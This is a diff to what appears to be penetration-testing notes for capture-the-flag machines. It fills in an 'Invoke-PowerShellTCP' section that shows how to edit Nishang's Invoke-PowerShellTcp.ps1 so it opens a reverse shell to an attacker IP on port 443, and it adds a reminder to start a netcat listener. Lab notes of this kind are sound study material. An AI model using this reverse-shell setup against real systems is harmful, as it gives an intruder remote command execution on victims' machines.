@@ -62,6 +62,25 @@ TODO
 [[Anubis]]
 
 ### Invoke-PowerShellTCP
-TODO
+In order to connect to get a reverse shell with powershell we can abuse of the [Invoke-PowerShellTCP.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) all we need to do is modify the very bottom of this .ps1 file as follows:
+```powershell
+# Invoke-PowerShellTCP.ps1
+------------------------SNIP---------------------------
+    catch
+    {
+        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port."
+        Write-Error $_
+    }
+}
+
+Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.2 -Port 443 -Rows 37 -Cols 189
+```
+> To get the file in rows and columns of the screen we can execute the stty size on our attacker machine.
+{: .prompt-info }
+
+> Don't forget to open your listener with netcat locally.
+{: .prompt-tip }
+Examples:
+[Streamio](https://shuciran.github.io/posts/Streamio/#fnref:invoke-powershelltcp-ps1)
 [[Anubis]]
 
